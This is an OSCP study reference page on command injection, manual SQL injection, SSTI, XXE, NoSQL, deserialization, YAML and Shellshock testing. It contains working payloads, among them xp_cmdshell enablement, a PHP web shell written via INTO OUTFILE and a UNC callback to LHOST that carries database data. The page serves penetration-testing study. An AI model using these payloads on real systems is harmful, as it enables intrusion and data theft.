@@ -1,0 +1,276 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="generator" content="Astro v7.2.0"><meta name="description" content="Commands, variants, interpretation and next actions for Command and Manual SQL Injection."><meta name="theme-color" content="#121414"><link rel="canonical" href="https://armaanleg3nd.github.io/tools/oscp/reference/03-initial-access/03-command-and-sql-injection/"><link rel="icon" href="/favicon.svg" type="image/svg+xml"><meta property="og:title" content="Command and Manual SQL Injection | OSCP reference | Armaan"><meta property="og:description" content="Commands, variants, interpretation and next actions for Command and Manual SQL Injection."><meta property="og:type" content="website"><meta property="og:url" content="https://armaanleg3nd.github.io/tools/oscp/reference/03-initial-access/03-command-and-sql-injection/"><title>Command and Manual SQL Injection | OSCP reference | Armaan</title><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="swap"><script type="module" src="/_assets/ClientRouter.astro_astro_type_script_index_0_lang.xc6nT38P.js"></script><link rel="stylesheet" href="/_assets/BaseLayout.C8rLAhpp.css"><link rel="stylesheet" href="/_assets/ToolLayout.Bh0Ez8ox.css"><style>.full-reference{max-width:1420px;color:var(--text);margin:auto;padding:2rem clamp(1rem,4vw,4rem) 5rem}.full-reference a{color:var(--cyan-soft)}.full-reference h1{margin:1.25rem 0;font-size:clamp(1.7rem,3vw,2.5rem);line-height:1.2}.full-reference p{color:var(--muted);max-width:80ch;line-height:1.8}.reference-find{gap:.6rem;max-width:44rem;margin:1.5rem 0;font-size:.85rem;display:grid}.reference-find input{border:1px solid var(--line-strong);background:var(--surface-low);color:var(--text);border-radius:3px;padding:.8rem}.reference-index{grid-template-columns:repeat(2,minmax(0,1fr));gap:2rem;display:grid}.reference-index section{min-width:0}.reference-index h2{text-transform:capitalize;border-bottom:1px solid var(--line);padding-bottom:.7rem;font-size:1.2rem}.reference-index h3{margin:1.3rem 0 .5rem;font-size:1rem}.reference-index ul{padding-left:1.2rem;font-size:.84rem;line-height:1.9}.reference-index .level-3{color:var(--muted);margin-left:1rem;font-size:.76rem}.reference-index [hidden]{display:none}.reference-reading{grid-template-columns:240px minmax(0,1fr);gap:2.5rem;display:grid}.reference-reading nav{top:calc(var(--header-height) + 1rem);max-height:calc(100dvh - var(--header-height) - 2rem);border-right:1px solid var(--line);align-self:start;padding:1rem;font-size:.76rem;position:sticky;overflow:auto}.reference-reading nav ul{padding:0;list-style:none}.reference-reading nav li{margin:.7rem 0;line-height:1.5}.reference-reading nav .level-3{padding-left:1rem;font-size:.7rem}.reference-prose{min-width:0;line-height:1.85}.reference-prose :is(h1,h2,h3,h4){scroll-margin-top:calc(var(--header-height) + 1.5rem);margin:2rem 0 1rem;line-height:1.35}.reference-prose h2{border-top:1px solid var(--line);padding-top:1.5rem;font-size:1.35rem}.reference-prose h3{font-size:1.05rem}.reference-prose pre{border:1px solid var(--line);background:var(--surface-low);max-width:100%;font:.8rem/1.75 var(--mono);border-radius:3px;padding:2.5rem 1rem 1rem;position:relative;overflow:auto}.reference-prose [data-reference-copy]{border:1px solid var(--line);color:var(--cyan-soft);font:.65rem var(--mono);cursor:pointer;background:0 0;padding:.2rem .5rem;position:absolute;top:.4rem;right:.5rem}.reference-prose code{overflow-wrap:anywhere;font-size:.85em}.reference-prose pre code{overflow-wrap:normal;font-size:inherit}.reference-prose blockquote{border-left:2px solid var(--cyan);color:var(--muted);margin:1.25rem 0;padding-left:1rem}.reference-prose table{border-collapse:collapse;max-width:100%;font-size:.8rem;display:block;overflow:auto}.reference-prose :is(td,th){border:1px solid var(--line);text-align:left;padding:.6rem}.reference-prose img{max-width:100%;height:auto}.reference-prose details{border-top:1px solid var(--line);padding:.8rem 0}.reference-prose summary{cursor:pointer;color:var(--cyan-soft)}@media (width<=850px){.reference-index,.reference-reading{grid-template-columns:1fr}.reference-reading nav{border:1px solid var(--line);max-height:18rem;position:static}.full-reference{padding-top:1rem}}
+</style><style>[data-astro-transition-scope="astro-nfpogox7-1"] { view-transition-name: page-content; }@layer astro { ::view-transition-old(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style></head><body><a class="skip-link" href="#main-content">Skip to content</a><header class="site-header" data-astro-cid-wpvy4v7s><nav class="site-nav" aria-label="Primary navigation" data-astro-cid-wpvy4v7s><a class="brand" href="/" aria-label="leg3nd home" data-astro-cid-wpvy4v7s><span data-astro-cid-wpvy4v7s>leg3nd</span><small data-astro-cid-wpvy4v7s>Projects &amp; tools</small></a><button class="nav-toggle" type="button" aria-expanded="false" aria-controls="nav-links" data-astro-cid-wpvy4v7s><span data-astro-cid-wpvy4v7s>MENU</span><span class="nav-toggle__glyph" aria-hidden="true" data-astro-cid-wpvy4v7s>[+]</span></button><div class="nav-links" id="nav-links" data-astro-cid-wpvy4v7s><a href="/" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>01</span>Home</a><a href="/projects/" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>02</span>Projects</a><a href="/tools/" class="active" aria-current="page" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>03</span>Tools</a></div><div class="system-state" aria-label="Timezone" data-astro-cid-wpvy4v7s>GMT+8</div></nav></header><script type="module">var e=()=>{let e=document.querySelector(`.nav-toggle`),t=document.querySelector(`.nav-links`);if(!e||!t||e.dataset.bound===`true`)return;e.dataset.bound=`true`;let n=()=>{e.setAttribute(`aria-expanded`,`false`),t.dataset.open=`false`;let n=e.querySelector(`.nav-toggle__glyph`);n&&(n.textContent=`[+]`)};e.addEventListener(`click`,()=>{let n=e.getAttribute(`aria-expanded`)===`true`;e.setAttribute(`aria-expanded`,String(!n)),t.dataset.open=String(!n);let r=e.querySelector(`.nav-toggle__glyph`);r&&(r.textContent=n?`[+]`:`[-]`)}),t.addEventListener(`click`,e=>{e.target.closest(`a`)&&n()}),e.closest(`nav`)?.addEventListener(`keydown`,t=>{t.key===`Escape`&&(n(),e.focus())})};document.addEventListener(`astro:page-load`,e),e();</script><div data-astro-transition-scope="astro-nfpogox7-1" id="main-content"><div class="tools-surface"><main class="full-reference"><p><a href="/tools/oscp/reference/">← Complete task index</a> · <a href="/tools/oscp/">Workspace</a></p><div class="reference-reading"><nav aria-label="On this page"><strong>On this page</strong><ul><li class="level-2"><a href="#operating-system-command-injection">Operating-system command injection</a></li><li class="level-3"><a href="#visible-output-baseline">Visible-output baseline</a></li><li class="level-3"><a href="#blind-timing-proof">Blind timing proof</a></li><li class="level-3"><a href="#after-command-execution">After command execution</a></li><li class="level-2"><a href="#manual-sql-injection-workflow">Manual SQL injection workflow</a></li><li class="level-3"><a href="#1-establish-query-influence">1. Establish query influence</a></li><li class="level-3"><a href="#2-authentication-bypass-candidate">2. Authentication-bypass candidate</a></li><li class="level-3"><a href="#3-determine-union-shape">3. Determine UNION shape</a></li><li class="level-3"><a href="#4-extract-only-after-fingerprinting-the-dbms">4. Extract only after fingerprinting the DBMS</a></li><li class="level-3"><a href="#5-boolean--or-time-blind-extraction">5. Boolean- or time-blind extraction</a></li><li class="level-2"><a href="#database-control-to-operating-system-effect">Database control to operating-system effect</a></li><li class="level-2"><a href="#out-of-band-sql-injection-boundary">Out-of-band SQL injection boundary</a></li><li class="level-2"><a href="#failure-guided-decisions">Failure-guided decisions</a></li><li class="level-2"><a href="#handoffs">Handoffs</a></li><li class="level-2"><a href="#ssti--prove-template-evaluation-then-identify-the-engine">SSTI — prove template evaluation, then identify the engine</a></li><li class="level-2"><a href="#xxe--test-the-xml-parser-and-file-read-result">XXE — test the XML parser and file-read result</a></li><li class="level-2"><a href="#nosql-operator-injection--separate-json-objects-from-strings">NoSQL operator injection — separate JSON objects from strings</a></li><li class="level-2"><a href="#php-deserialization--match-the-gadget-to-installed-dependencies">PHP deserialization — match the gadget to installed dependencies</a></li><li class="level-2"><a href="#unsafe-yaml-construction--distinguish-loading-from-safe-parsing">Unsafe YAML construction — distinguish loading from safe parsing</a></li><li class="level-2"><a href="#sql-truncation-or-normalization-mismatch-at-registration">SQL truncation or normalization mismatch at registration</a></li><li class="level-2"><a href="#shellshock-candidate--only-for-a-cgi-path-that-invokes-vulnerable-bash">Shellshock candidate — only for a CGI path that invokes vulnerable Bash</a></li><li class="level-2"><a href="#sources">Sources</a></li></ul></nav><article class="reference-prose"><h1 id="command-and-manual-sql-injection">Command and Manual SQL Injection</h1>
+<p><a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/03-initial-access/README.md">← Stage index</a> · <a href="/tools/oscp/reference/02-service-enumeration/10-http-web-mapping/">Web mapping</a> · <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/cheatsheets/web-exploitation.md#command-injection">Quick sheet</a> · <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/notes/Master_Notes.md#injection-primitives">Mechanics</a> | <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/notes/Attack_Strategy_Map.md">Strategy map</a> | Study methods: <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/notes/methods/web-exploitation.md">Turn application weaknesses into access</a></p>
+<blockquote>
+<p><strong>Use when:</strong> mapped application behavior suggests attacker input reaches an operating-system command or database query. Preserve a valid baseline, change one input at a time and prove each capability separately.</p>
+</blockquote>
+<h2 id="operating-system-command-injection">Operating-system command injection</h2>
+<h3 id="visible-output-baseline">Visible-output baseline</h3>
+<p>Start with a benign identity marker appropriate to the inferred operating system:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">curl -skG --data-urlencode 'host=127.0.0.1;id' http://TARGET:PORT/PATH
+curl -skG --data-urlencode 'host=127.0.0.1&#x26;whoami' http://TARGET:PORT/PATH
+</code></pre>
+<blockquote>
+<p><strong>Decisive output:</strong> command output attributable to the target, such as a username/UID that is absent from the normal response. Reflection of the payload is not execution.</p>
+</blockquote>
+<details>
+<summary><strong>Variants — separators, quoting and POST bodies</strong></summary>
+<p>Test only the forms compatible with the observed command and platform:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">127.0.0.1; id
+127.0.0.1 &#x26;&#x26; id
+127.0.0.1 | id
+127.0.0.1%0aid
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">curl -sk -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'host=127.0.0.1;id' http://TARGET:PORT/PATH
+curl -sk -X POST -H 'Content-Type: application/json' -d '{"host":"127.0.0.1;id"}' http://TARGET:PORT/api/PATH
+</code></pre>
+<p>For Windows command contexts, use an observed <code>cmd.exe</code> or PowerShell boundary before choosing syntax:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">127.0.0.1 &#x26; whoami
+127.0.0.1 | whoami
+</code></pre>
+</details>
+<h3 id="blind-timing-proof">Blind timing proof</h3>
+<p>Repeat a control and a bounded-delay request several times:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">curl -sk -o /dev/null -w 'control=%{time_total}\n' -G --data-urlencode 'host=127.0.0.1' http://TARGET:PORT/PATH
+curl -sk -o /dev/null -w 'test=%{time_total}\n' -G --data-urlencode 'host=127.0.0.1;sleep 5' http://TARGET:PORT/PATH
+</code></pre>
+<p>Windows candidate after platform evidence:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">127.0.0.1 &#x26; timeout /t 5
+</code></pre>
+<blockquote>
+<p><strong>Decisive output:</strong> a repeatable delay near the chosen interval relative to multiple controls. One slow response is inconclusive.</p>
+</blockquote>
+<h3 id="after-command-execution">After command execution</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">Linux:   id; hostname; pwd
+Windows: whoami; hostname; cd
+</code></pre>
+<p>Record the execution identity, working directory, shell/parser and egress assumptions. Hand reliable-session work to Block 7; do not treat one command response as an interactive shell.</p>
+<h2 id="manual-sql-injection-workflow">Manual SQL injection workflow</h2>
+<blockquote>
+<p><strong>Exam boundary:</strong> the current OSCP+ exam guide prohibits SQLmap and other automatic exploitation tools. The following procedure is manual. Recheck the current guide before an exam.</p>
+</blockquote>
+<h3 id="1-establish-query-influence">1. Establish query influence</h3>
+<p>Replay a valid request in Burp Repeater. Change one parameter and compare a normal value, quote, true condition and false condition:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">VALUE
+VALUE'
+VALUE' AND '1'='1
+VALUE' AND '1'='2
+</code></pre>
+<p>For a numeric context:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">1
+1 AND 1=1
+1 AND 1=2
+</code></pre>
+<blockquote>
+<p><strong>Evidence:</strong> a database error, stable true/false response difference, or repeatable database-specific delay. An isolated <code>500</code>, WAF block or generic application error is not enough.</p>
+</blockquote>
+<h3 id="2-authentication-bypass-candidate">2. Authentication-bypass candidate</h3>
+<p>In an authorized disposable lab, preserve the application's quoting and comment syntax:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">' OR 1=1-- -
+administrator'-- -
+</code></pre>
+<blockquote>
+<p><strong>Verification:</strong> identify the resulting account/session and perform a separate authorized request. A redirect or welcome string alone can be misleading.</p>
+</blockquote>
+<h3 id="3-determine-union-shape">3. Determine UNION shape</h3>
+<p>First establish column count:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">' ORDER BY 1-- -
+' ORDER BY 2-- -
+' ORDER BY 3-- -
+</code></pre>
+<p>Or increment <code>NULL</code> columns until the query succeeds:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">' UNION SELECT NULL-- -
+' UNION SELECT NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL-- -
+</code></pre>
+<p>Then find a displayed text-compatible column:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">' UNION SELECT NULL,'MARKER_7F31',NULL-- -
+</code></pre>
+<blockquote>
+<p><strong>Decisive output:</strong> the marker appears in a response location controlled by the injected row. Match the exact column count and data types.</p>
+</blockquote>
+<h3 id="4-extract-only-after-fingerprinting-the-dbms">4. Extract only after fingerprinting the DBMS</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">MySQL:      ' UNION SELECT NULL,version(),NULL-- -
+PostgreSQL: ' UNION SELECT NULL,version(),NULL-- -
+MSSQL:      ' UNION SELECT NULL,@@version,NULL-- -
+</code></pre>
+<p>Use the confirmed DBMS's catalog and concatenation syntax rather than cycling unrelated payloads. Keep each extraction request reproducible in Repeater.</p>
+<h3 id="5-boolean--or-time-blind-extraction">5. Boolean- or time-blind extraction</h3>
+<p>Choose a stable page marker or content length for true/false comparisons:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">' AND SUBSTRING((SELECT version()),1,1)='P'-- -
+' AND SUBSTRING((SELECT version()),1,1)='X'-- -
+</code></pre>
+<p>DBMS-specific time proofs:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">MySQL:      ' AND IF(1=1,SLEEP(5),0)-- -
+PostgreSQL: '; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
+MSSQL:      '; IF (1=1) WAITFOR DELAY '0:0:5'--
+</code></pre>
+<blockquote>
+<p>Repeat controls. Time-based results are invalid if application latency overlaps the chosen delay or the condition cannot be changed independently.</p>
+</blockquote>
+<h2 id="database-control-to-operating-system-effect">Database control to operating-system effect</h2>
+<p>This is a new transition, not an automatic consequence of SQL injection. Verify the DBMS identity, database role, feature state, filesystem permissions and path or egress assumptions first.</p>
+<details>
+<summary><strong>MSSQL — xp_cmdshell when privilege and policy allow</strong></summary>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-sql">EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+</code></pre>
+<p>Requires sufficient server privilege; enabling it changes server configuration. Prefer a direct proof when it is already enabled. Verify the Windows service identity returned by <code>whoami</code>.</p>
+</details>
+<details>
+<summary><strong>PostgreSQL — COPY PROGRAM when role and version allow</strong></summary>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-sql">DROP TABLE IF EXISTS cmd_output;
+CREATE TABLE cmd_output(line text);
+COPY cmd_output FROM PROGRAM 'id';
+SELECT * FROM cmd_output;
+</code></pre>
+<p>Requires a superuser or a role such as <code>pg_execute_server_program</code>; the command runs under the database service account.</p>
+</details>
+<details>
+<summary><strong>MySQL/MariaDB — file write as a separate primitive</strong></summary>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-sql">SELECT '&#x3C;?php echo shell_exec($_GET["cmd"]); ?>'
+INTO OUTFILE '/CONFIRMED/WEBROOT/check.php';
+</code></pre>
+<p>Requires <code>FILE</code> privilege, a permitted <code>secure_file_priv</code> destination, a known writable webroot and PHP execution there. Verify the file through HTTP, then verify execution. If it only displays or downloads, only file write is proven.</p>
+</details>
+<h2 id="out-of-band-sql-injection-boundary">Out-of-band SQL injection boundary</h2>
+<p>Out-of-band testing is relevant only when direct content, errors, boolean differences and repeatable time delays cannot produce decisive evidence and the database can initiate a network request. A callback proves server/database-side resolution or connectivity; it does not by itself prove arbitrary query-result extraction.</p>
+<p>Hypothetical MySQL/Windows UNC lookup in an authorized lab:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-sql">SELECT LOAD_FILE(CONCAT('\\\\LHOST\\', DATABASE()));
+</code></pre>
+<p>Use a uniquely labelled controlled listener/domain and transmit no sensitive row data during proof. Required conditions include a DBMS/function that performs the lookup, sufficient database/OS permissions, working outbound DNS/SMB/HTTP as applicable and an observable callback. No callback is inconclusive until query execution and outbound reachability are separated. Avoid poisoning/spoofing; the current OSCP+ exam guide prohibits spoofing.</p>
+<h2 id="failure-guided-decisions">Failure-guided decisions</h2>
+<ul>
+<li>quote causes generic error only -> compare true/false and inspect whether the application, proxy or WAF generated it;</li>
+<li><code>UNION</code> always errors -> recheck context, column count, types, parentheses and comment syntax;</li>
+<li>blind pages differ randomly -> find a stable marker or repeat timing controls before continuing;</li>
+<li>command payload is reflected -> no execution proof; compare command-derived output or side effect;</li>
+<li>command executes but callback fails -> keep execution confirmed and diagnose listener, route, payload and egress separately in Block 7;</li>
+<li>database identity lacks the required role/feature -> retain data access and search extracted configuration/credentials rather than assuming OS execution.</li>
+</ul>
+<h2 id="handoffs">Handoffs</h2>
+<ul>
+<li>extracted password/hash/key/token -> Block 5 with source and identity context;</li>
+<li>exact vulnerable product/version or stored procedure requirement -> Block 6;</li>
+<li>verified OS command -> Block 7 session handling;</li>
+<li>file write into web content -> <a href="/tools/oscp/reference/03-initial-access/02-web-file-handling/">web file handling</a>;</li>
+<li>useful application account/role -> remap authenticated behavior in Block 3.</li>
+</ul>
+<h2 id="ssti--prove-template-evaluation-then-identify-the-engine">SSTI — prove template evaluation, then identify the engine</h2>
+<p>Use when controlled text appears inside a server-rendered template, email preview or report. Replay the real parameter and session. These are separate probes, not one universal payload:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash"># Jinja/Twig-style expression probe
+curl -sS -G --data-urlencode 'name={{7*7}}' http://TARGET:PORT/PATH
+
+# A different delimiter family, only when the first is literal or errors suggest it
+curl -sS -G --data-urlencode 'name=${7*7}' http://TARGET:PORT/PATH
+
+# Jinja-versus-Twig clue; interpret alongside source/errors, not in isolation
+curl -sS -G --data-urlencode "name={{7*'7'}}" http://TARGET:PORT/PATH
+</code></pre>
+<p>Read: changed, repeatable computed output compared with a literal control supports evaluation. <code>49</code> alone does not identify the engine. Jinja commonly repeats the string; Twig commonly treats it numerically. Confirm the engine/version and exposed objects before selecting a file-read or command primitive. Literal reflection → inspect another template/input boundary; a syntax error alone does not prove an exploitable expression.</p>
+<p>Sources: <a href="https://portswigger.net/web-security/server-side-template-injection">upstream 1</a>.</p>
+<h2 id="xxe--test-the-xml-parser-and-file-read-result">XXE — test the XML parser and file-read result</h2>
+<p>Use a working XML request and put the entity reference in a field whose parsed value is returned. Retain the original wrapper, cookies and endpoint. Example body for an XML-compatible endpoint:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-xml">&#x3C;?xml version="1.0"?>
+&#x3C;!DOCTYPE request [&#x3C;!ENTITY probe SYSTEM "file:///etc/passwd">]>
+&#x3C;request>&#x3C;value>&#x26;probe;&#x3C;/value>&#x3C;/request>
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">curl -i -b cookies.txt -H 'Content-Type: application/xml' \
+  --data-binary @xxe.xml http://TARGET:PORT/PATH
+</code></pre>
+<p>Read: recognizable file content in the parsed field proves read access; echoing the submitted XML does not. Choose a platform-appropriate file; Windows can use <code>file:///C:/Windows/win.ini</code>. DTD rejection or unresolved entities → check the parser's actual configuration, not more traversal depth.</p>
+<p>If the application builds XML around your input and processes XInclude, a separate condition can exist without control over the document's DOCTYPE:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-xml">&#x3C;value xmlns:xi="http://www.w3.org/2001/XInclude">
+  &#x3C;xi:include parse="text" href="file:///etc/passwd"/>
+&#x3C;/value>
+</code></pre>
+<p>A blind endpoint needs an observable parser/network effect before any exfiltration claim. Follow verified config/source reads into credential or application testing.</p>
+<p>Sources: <a href="https://portswigger.net/web-security/xxe">upstream 1</a>.</p>
+<h2 id="nosql-operator-injection--separate-json-objects-from-strings">NoSQL operator injection — separate JSON objects from strings</h2>
+<p>Use when a login/search accepts structured JSON or nested form parameters and evidence suggests a MongoDB-style query. Start with a normal failed request, then change one value's type.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash"># A known username with an operator-valued password
+curl -i -c cookies.txt -H 'Content-Type: application/json' \
+  --data '{"username":"USER","password":{"$ne":""}}' http://TARGET:PORT/LOGIN
+
+# Distinct context: a form parser that expands bracketed properties
+curl -i -c cookies.txt --data-urlencode 'username=USER' \
+  --data-urlencode 'password[$ne]=x' http://TARGET:PORT/LOGIN
+</code></pre>
+<p>Read: compare against the same operator encoded as a plain string and against a known wrong password. Confirm the resulting identity through a protected route. A 200/login page or changed error is not authenticated access. Type validation, hashing the supplied password before querying, or removal of <code>$</code> operators can rule out this route. Broader <code>$ne</code> username queries may select an unexpected first account; keep the intended identity explicit.</p>
+<p>Sources: <a href="https://portswigger.net/web-security/nosql-injection">upstream 1</a>.</p>
+<h2 id="php-deserialization--match-the-gadget-to-installed-dependencies">PHP deserialization — match the gadget to installed dependencies</h2>
+<p>Use when a controlled serialized value reaches unsafe <code>unserialize()</code> and the required classes are loaded. Identify dependencies/builds from source or <code>composer.lock</code> first.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash"># Inspect available families and the exact chain's version/vector requirements
+phpggc -l
+phpggc -i Monolog/RCE1
+
+# Example function-call gadget, only when that chain matches the application
+phpggc -b Monolog/RCE1 system id > payload.b64
+</code></pre>
+<p>Read: base64 is a transport choice, not a bypass—the sink must decode it before deserialization. Preserve raw serialized lengths and binary bytes; use the encoding that the real request expects. A generated payload is not execution proof. Missing classes, rejected object types or a different dependency version → choose a matching chain or another primitive. Verify a benign effect before selecting a shell payload.</p>
+<p>Sources: <a href="https://github.com/ambionics/phpggc">upstream 1</a>.</p>
+<h2 id="unsafe-yaml-construction--distinguish-loading-from-safe-parsing">Unsafe YAML construction — distinguish loading from safe parsing</h2>
+<p>Use when source or errors identify Python YAML processing with an unsafe loader and you control the loaded YAML. An ordinary JSON field or <code>yaml.safe_load()</code> does not supply this condition.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-yaml">!!python/object/apply:os.system ["id"]
+</code></pre>
+<p>Put the probe in the actual YAML input/file, preserving its required surrounding structure. Read: attributable command output/effect supports unsafe construction. <code>ConstructorError</code> for the Python tag commonly indicates a loader that does not permit that constructor. Confirm the installed PyYAML version and loader (<code>UnsafeLoader</code>/unsafe load), rather than assuming that any use of YAML permits Python object execution.</p>
+<p>Sources: <a href="https://github.com/yaml/pyyaml">upstream 1</a>.</p>
+<h2 id="sql-truncation-or-normalization-mismatch-at-registration">SQL truncation or normalization mismatch at registration</h2>
+<p>Use when the application checks one representation for uniqueness but the DB stores or compares a different one—for example, an overlong username in a fixed-length column. Validate with a disposable account first.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-sql">-- With SQL visibility, inspect the real column and strict-mode behavior
+SELECT @@sql_mode;
+SELECT COLUMN_NAME, CHARACTER_MAXIMUM_LENGTH
+FROM information_schema.columns
+WHERE table_schema = DATABASE() AND table_name = 'users';
+</code></pre>
+<p>Compare registration/login behavior for the test name, its trailing-space form and an overlong form that would truncate to it. A plus character only becomes a space in the appropriate form encoding; it is not a universal SQL payload. A strict length error or a unique constraint on the normalized stored value can stop this path. Confirm an actual account/authorization change before calling it a bypass.</p>
+<p>Sources: <a href="https://dev.mysql.com/doc/refman/8.4/en/sql-mode.html">upstream 1</a>.</p>
+<h2 id="shellshock-candidate--only-for-a-cgi-path-that-invokes-vulnerable-bash">Shellshock candidate — only for a CGI path that invokes vulnerable Bash</h2>
+<p>Use when a confirmed CGI endpoint passes HTTP-derived environment variables into an affected Bash process. An arbitrary PHP/Java route or a Bash version string alone does not establish this chain.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash"># Bounded command-effect probe at the actual CGI script
+curl -i -H 'User-Agent: () { :;}; echo; /usr/bin/id' \
+  http://TARGET:PORT/cgi-bin/SCRIPT
+</code></pre>
+<p>Read: an attributable UID in the executed CGI response supports the effect; reflection of the header text does not. Header/CGI parsing errors require inspecting the request and script behavior. No effect → re-check the actual component and patch status before selecting another PoC. This is the CVE-2014-6271 family, not a generic command separator for every web input.</p>
+<p>Sources: <a href="https://nvd.nist.gov/vuln/detail/CVE-2014-6271">upstream 1</a>.</p>
+<h2 id="sources">Sources</h2>
+<p>Supplied PEN-200 Ch 9.4 pp274-279 and Ch 10 pp285-300; reviewed <a href="https://lizajose.github.io/getSH/web">getSH Web/SQLi route</a>; <a href="https://github.com/LeonardoE95/OSCP/tree/main/modules/web/03-sql-injection">Hexdump SQL injection module</a>; <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection">OWASP command injection testing</a>, <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection">OWASP SQL injection testing</a>; current <a href="https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide">OSCP+ exam guide</a>.</p></article></div></main></div></div><footer class="site-footer" data-astro-cid-jo6i4kqk><div class="footer-inner" data-astro-cid-jo6i4kqk><nav class="footer-links" aria-label="Footer navigation" data-astro-cid-jo6i4kqk><a href="/" data-astro-cid-jo6i4kqk>Home</a><a href="/projects/" data-astro-cid-jo6i4kqk>Projects</a><a href="/tools/" aria-current="page" data-astro-cid-jo6i4kqk>Tools</a></nav><nav class="footer-tools" aria-label="Interactive tools" data-astro-cid-jo6i4kqk><span data-astro-cid-jo6i4kqk>Interactive tools</span><a 